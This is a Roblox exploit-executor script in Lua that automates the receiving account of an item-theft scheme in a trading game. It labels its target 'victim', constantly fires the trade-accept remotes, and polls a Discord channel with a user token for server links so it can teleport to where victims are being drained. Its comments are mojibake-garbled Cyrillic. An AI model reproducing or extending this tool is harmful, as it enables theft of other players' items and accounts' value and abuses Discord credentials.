if not game:IsLoaded() then
	game.Loaded:Wait() -- Wait for game to load
end

if token == "" or channelId == "" then
    game.Players.LocalPlayer:kick("Add your token or channelId to use")
end

local bb = game:GetService("VirtualUser") -- Anti AFK
game:service "Players".LocalPlayer.Idled:connect(
    function()
        bb:CaptureController()
        bb:ClickButton2(Vector2.new())
    end
)

local HttpServ = game:GetService("HttpService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local victimFile = isfile("user.txt")
local joinedFile = isfile("joined_ids.txt")
if not victimFile then
    writefile("user.txt", "victim username")
end
if not joinedFile then
    writefile("joined_ids.txt", "[]") -- Initialize with empty JSON array
end
local victimUser = readfile("user.txt")
local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
local isTeleporting = false
local timer = 0

local function selectDevice()
    while task.wait(0.1) do
        local DeviceSelectGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
        if DeviceSelectGui then
            local Container = DeviceSelectGui:WaitForChild("Container")
            local Mouse = game.Players.LocalPlayer:GetMouse()
            local button = Container:WaitForChild("Phone"):WaitForChild("Button")
            local buttonPos = button.AbsolutePosition
            local buttonSize = button.AbsoluteSize
            local centerX = buttonPos.X + buttonSize.X / 2
            local centerY = buttonPos.Y + buttonSize.Y / 2
            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, game, 1)
            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, game, 1)
        end
    end
end

task.spawn(selectDevice)

local mainGui = game.Players.LocalPlayer:WaitForChild("PlayerGui", 30):WaitForChild("MainGUI", 30):WaitForChild("Game", 30) -- Wait for main gui so we know we are loaded in
local waittime = delay or 3
wait(waittime) -- Small delay to account for ping and stuff
local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest') -- Just to make sure we are fully loaded before chatting (or it will bug)
game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('hi')

local function saveJoinedId(messageId)
    table.insert(joinedIds, messageId) -- Add the new ID
    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds)) -- Save back to the file
end

local function acceptRequest()
    while task.wait(0.1) do
        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest'):FireServer()
    end
end

local function acceptTrade()
    while task.wait(0.1) do
        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({[1] = 285646582}))
    end
end

local function waitForPlayerLeave()
    local playerRemovedConnection
    playerRemovedConnection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
        if removedPlayer.Name == victimUser then
            if playerRemovedConnection then
                playerRemovedConnection:Disconnect()
            end
            didVictimLeave = true
        end
    end)
end

local function IsTrading()
    local trade_statue = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
    if trade_statue == "StartTrade" then
        return true
    else
        return false
    end
end

local function tradeTimer()
    while task.wait(1) do
        if IsTrading() then
            timer = 0
        else
            timer = timer + 1
        end
    end
end

waitForPlayerLeave()
task.spawn(acceptRequest) -- Start accepting trade requests
task.spawn(acceptTrade) -- Start accepting trades
task.spawn(tradeTimer)

local lastCheckedMessageId = nil

-- –£–ª—É—á—à–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ Discord
local function checkDiscord()
    local response = request({
        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=5",
        Method = "GET",
        Headers = {
            ['Authorization'] = token,
            ['Content-Type'] = 'application/json'
        }
    })

    if not response.Success then
        warn("‚ùå –û—à–∏–±–∫–∞ Discord:", response.StatusCode)
        return false
    end

    local messages = HttpService:JSONDecode(response.Body)
    
    -- –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏—è –≤ –æ–±—Ä–∞—Ç–Ω–æ–º –ø–æ—Ä—è–¥–∫–µ (–æ—Ç –Ω–æ–≤—ã—Ö –∫ —Å—Ç–∞—Ä—ã–º)
    for i = #messages, 1, -1 do
        local msg = messages[i]
        
        -- –ü—Ä–æ–ø—É—Å–∫–∞–µ–º —É–∂–µ –ø—Ä–æ–≤–µ—Ä–µ–Ω–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è
        if lastCheckedMessageId and msg.id == lastCheckedMessageId then
            break
        end

        if msg.content then
            print("üîç –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ:", string.sub(msg.content, 1, 100))
            
            -- –ò—â–µ–º –∫–æ–º–∞–Ω–¥—É —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏ –≤ –ª—é–±–æ–º —Ñ–æ—Ä–º–∞—Ç–µ
            local placeId, jobId = msg.content:match('TeleportService["\'%)]%s*:%s*TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']')
            if not placeId or not jobId then
                placeId, jobId = msg.content:match('game%s*[:%.]%s*GetService%s*%(%s*["\']TeleportService["\']%s*%)%s*:%s*TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']')
            end

            if placeId and jobId then
                print("üéØ –ù–∞–π–¥–µ–Ω—ã ID:", placeId, jobId)
                
                if not table.find(joinedIds, msg.id) then
                    table.insert(joinedIds, msg.id)
                    writefile("joined_ids.txt", HttpService:JSONEncode(joinedIds))
                    
                    print("üöÄ –¢–µ–ª–µ–ø–æ—Ä—Ç–∏—Ä—É–µ–º—Å—è...")
                    isTeleporting = true
                    lastCheckedMessageId = msg.id
                    
                    local success = pcall(function()
                        game:GetService("TeleportService"):TeleportToPlaceInstance(tonumber(placeId), jobId)
                    end)
                    
                    if not success then
                        isTeleporting = false
                        warn("‚ùå –û—à–∏–±–∫–∞ —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏")
                    end
                    return true
                else
                    print("‚ö†Ô∏è –£–∂–µ –±—ã–ª–∏ –Ω–∞ —ç—Ç–æ–º —Å–µ—Ä–≤–µ—Ä–µ")
                end
            end
        end
    end
    
    -- –ó–∞–ø–æ–º–∏–Ω–∞–µ–º ID –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è, –µ—Å–ª–∏ –Ω–∏—á–µ–≥–æ –Ω–µ –Ω–∞—à–ª–∏
    if #messages > 0 then
        lastCheckedMessageId = messages[1].id
    end
    
    return false
end

-- –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª —Å –æ–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–º–∏ –∏–Ω—Ç–µ—Ä–≤–∞–ª–∞–º–∏
while true do
    if not isTeleporting then
        local found = pcall(checkDiscord)
        if not found then
            -- –ï—Å–ª–∏ –Ω–∏—á–µ–≥–æ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ, –∂–¥–µ–º –¥–æ–ª—å—à–µ
            task.wait(30)
        else
            -- –ï—Å–ª–∏ –Ω–∞—à–ª–∏ —á—Ç–æ-—Ç–æ, —Å–ª–µ–¥—É—é—â—É—é –ø—Ä–æ–≤–µ—Ä–∫—É –¥–µ–ª–∞–µ–º —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
            task.wait(5)
        end
    else
        -- –ï—Å–ª–∏ –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏, –∂–¥–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è
        task.wait(5)
    end
end
